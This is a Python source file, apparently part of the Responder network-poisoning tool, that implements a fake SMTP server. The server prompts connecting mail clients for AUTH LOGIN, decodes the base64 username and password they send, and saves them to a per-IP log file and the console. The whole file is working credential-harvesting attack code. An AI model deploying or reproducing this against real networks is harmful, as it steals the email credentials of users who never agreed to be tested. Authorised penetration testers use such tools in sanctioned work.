import os
import settings

from SocketServer import BaseRequestHandler
from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2

# ESMTP Server class
class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreeting()))
			data = self.request.recv(1024)

			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)

			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)

				if data:
					Username = b64decode(data[:len(data)-2])
					self.request.send(str(SMTPAUTH2()))
					data = self.request.recv(1024)

					if data:
						Password = b64decode(data[:len(data)-2])
						Outfile = os.path.join(settings.Config.ResponderPATH, 'logs', "SMTP-Clear-Text-Password-%s.txt" % self.client_address[0])
						WriteData(Outfile,Username+":"+Password, Username+":"+Password)

						print text("[SMTP] Address  : %s" % color(self.client_address[0], 3, 0))
						print text("[SMTP] Username : %s" % color(Username, 3, 0))
						print text("[SMTP] Password : %s" % color(Password, 3, 0))

						## FIXME: Close connection properly

		except Exception:
			pass